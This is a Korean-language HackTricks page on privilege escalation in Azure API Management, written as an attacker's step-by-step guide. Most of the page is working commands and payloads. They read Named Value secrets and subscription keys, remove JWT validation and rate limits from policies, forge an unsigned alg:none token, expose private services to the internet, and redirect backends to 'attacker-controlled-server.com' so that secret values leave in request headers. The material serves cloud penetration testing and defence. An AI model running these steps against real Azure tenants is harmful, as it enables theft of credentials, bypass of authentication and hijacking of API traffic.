# Az - API Management Privesc

{{#include ../../../banners/hacktricks-training.md}}

## `Microsoft.ApiManagement/service/namedValues/read` & `Microsoft.ApiManagement/service/namedValues/listValue/action`

이 공격은 Azure API Management Named Values에 저장된 민감한 비밀에 접근하는 것으로, 비밀 값을 직접 조회하거나 권한을 악용해 managed identities를 통해 Key Vault–backed secrets를 획득하는 방식입니다.
```bash
az apim nv show-secret --resource-group <resource-group> --service-name <service-name> --named-value-id <named-value-id>
```
## `Microsoft.ApiManagement/service/subscriptions/read` & `Microsoft.ApiManagement/service/subscriptions/listSecrets/action`
각 구독에 대해 공격자는 POST 메서드로 listSecrets 엔드포인트를 호출하여 구독 키를 얻을 수 있습니다:
```bash
az rest --method POST \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/subscriptions/<subscription-sid>/listSecrets?api-version=2024-05-01"
```
응답에는 구독의 primary key (primaryKey)와 secondary key (secondaryKey)가 포함되어 있습니다. 이 키들을 사용하면 공격자는 인증하여 API Management Gateway를 통해 게시된 API에 접근할 수 있습니다:
```bash
curl -H "Ocp-Apim-Subscription-Key: <primary-key-or-secondary-key>" \
https://<service-name>.azure-api.net/<api-path>
```
공격자는 해당 구독과 연결된 모든 API 및 제품에 접근할 수 있습니다. 구독이 민감한 제품이나 API에 접근 권한을 가지고 있다면, 공격자는 기밀 정보를 얻거나 무단으로 작업을 수행할 수 있습니다.

## `Microsoft.ApiManagement/service/policies/write` or `Microsoft.ApiManagement/service/apis/policies/write`

공격자는 먼저 현재 API 정책을 조회합니다:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/?api-version=2024-05-01&format=rawxml"
```
공격자는 목표에 따라 정책을 여러 가지 방식으로 수정할 수 있습니다. 예를 들어 authentication을 비활성화하려면, 정책에 JWT token validation이 포함되어 있는 경우 공격자는 해당 섹션을 제거하거나 주석 처리할 수 있습니다:
```xml
<policies>
<inbound>
<base />
<!-- JWT validation removed by the attacker -->
<!-- <validate-jwt header-name="Authorization" failed-validation-httpcode="401" >
...
</validate-jwt> -->
</inbound>
<backend>
<base />
</backend>
<outbound>
<base />
</outbound>
<on-error>
<base />
</on-error>
</policies>
```
rate limiting 제어를 제거하여 denial-of-service 공격을 허용하려면, 공격자는 quota 및 rate-limit 정책을 제거하거나 주석 처리할 수 있습니다:
```xml
<policies>
<inbound>
<base />
<!-- Rate limiting removed by the attacker -->
<!-- <rate-limit calls="100" renewal-period="60" />
<quota-by-key calls="1000" renewal-period="3600" counter-key="@(context.Subscription.Id)" /> -->
</inbound>
...
</policies>
```
백엔드 경로를 수정하여 트래픽을 공격자가 제어하는 서버로 리디렉션하려면:
```xml
<policies>
...
<inbound>
<base />
<set-backend-service base-url="https://attacker-controlled-server.com" />
</inbound>
...
</policies>
```
그런 다음 attacker는 수정된 정책을 적용합니다. 요청 본문은 정책을 XML 형식으로 포함하는 JSON 객체여야 합니다:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/policy?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"format": "rawxml",
"value": "<policies><inbound><base /></inbound><backend><base /></backend><outbound><base /></outbound><on-error><base /></on-error></policies>"
}
}'
```
## JWT 검증 구성 오류

공격자는 API가 JWT 토큰 검증을 사용하고 정책이 잘못 구성되어 있다는 것을 알아야 합니다. 잘못 구성된 JWT 검증 정책은 `require-signed-tokens="false"` 또는 `require-expiration-time="false"`를 포함할 수 있으며, 이는 서비스가 서명되지 않은 토큰이나 만료되지 않는 토큰을 수락하도록 허용합니다.

공격자는 none 알고리즘(서명되지 않음)을 사용하여 악성 JWT 토큰을 생성합니다:
```
# Header: {"alg":"none"}
# Payload: {"sub":"user"}
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0.
```
공격자는 악성 token을 사용하여 API에 요청을 보냅니다:
```bash
curl -X GET \
-H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0." \
https://<apim>.azure-api.net/path
```
정책이 `require-signed-tokens="false"`로 잘못 구성되어 있으면, 서비스는 서명되지 않은 token을 허용합니다. 공격자는 또한 `require-expiration-time="false"`인 경우 만료 claim 없이 token을 생성할 수 있습니다.

## `Microsoft.ApiManagement/service/applynetworkconfigurationupdates/action`
공격자는 먼저 서비스의 현재 네트워크 구성을 확인합니다:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01"
```
공격자는 JSON 응답을 검토하여 `publicNetworkAccess` 및 `virtualNetworkType` 값들을 확인한다. `publicNetworkAccess`가 false로 설정되어 있거나 `virtualNetworkType`이 Internal로 설정되어 있으면 서비스는 private access로 구성되어 있다.

서비스를 인터넷에 노출하려면 공격자는 두 설정을 모두 변경해야 한다. 서비스가 internal 모드로 실행 중이라면 (`virtualNetworkType: "Internal"`), 공격자는 이를 None 또는 External로 변경하고 public network access를 활성화한다. 이는 Azure Management API를 사용하여 수행할 수 있다:
```bash
az rest --method PATCH \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"publicNetworkAccess": "Enabled",
"virtualNetworkType": "None"
}
}'
```
한번 `virtualNetworkType`가 `None` 또는 `External`로 설정되고 `publicNetworkAccess`가 활성화되면, 서비스와 모든 API는 인터넷에서 접근 가능해집니다. 이는 이전에 사설 네트워크나 프라이빗 엔드포인트 뒤에 보호되어 있더라도 마찬가지입니다.

## `Microsoft.ApiManagement/service/backends/write`
공격자는 먼저 수정할 대상을 식별하기 위해 기존 백엔드를 열거합니다:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends?api-version=2024-05-01"
```
공격자는 수정하려는 백엔드의 현재 구성을 조회한다:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01"
```
공격자는 백엔드 URL을 자신이 제어하는 서버를 가리키도록 수정합니다. 먼저 이전 응답에서 ETag를 얻은 다음 백엔드를 업데이트합니다:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"description": "Backend modified by attacker"
}
}'
```
또는 공격자는 backend headers를 구성하여 비밀을 포함한 Named Values를 exfiltrate할 수 있습니다. 이는 backend credentials configuration을 통해 수행됩니다:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"credentials": {
"header": {
"X-Secret-Value": ["{{named-value-secret}}"]
}
}
}
}'
```
이 구성에서는 Named Values가 모든 요청에서 공격자가 제어하는 백엔드로 헤더로 전송되어 민감한 시크릿의 유출을 가능하게 합니다.

{{#include ../../../banners/hacktricks-training.md}}
